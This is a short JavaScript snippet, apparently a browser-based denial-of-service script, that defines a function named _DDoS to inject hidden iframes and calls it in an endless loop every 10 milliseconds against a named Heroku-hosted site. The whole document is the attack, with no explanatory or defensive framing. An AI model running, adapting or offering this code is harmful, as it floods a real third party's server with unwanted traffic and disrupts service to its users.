function _DDoS(url) {
    document.body.innerHTML += '<iframe src="' + url + '" style="display:none;"></iframe>';
}
for (;;) {
    setTimeout('_DDoS("http://adityaalifn.herokuapp.com/")', 10);
}